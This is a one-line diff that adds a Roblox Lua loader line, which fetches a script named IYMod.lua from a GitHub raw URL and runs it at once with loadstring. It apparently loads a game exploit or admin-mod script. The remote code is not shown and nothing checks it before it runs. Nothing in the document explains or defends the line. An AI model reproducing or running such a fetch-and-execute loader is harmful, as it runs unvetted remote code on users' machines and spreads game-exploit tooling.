@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ISJ0629/masterscript/main/IYMod.lua"))()
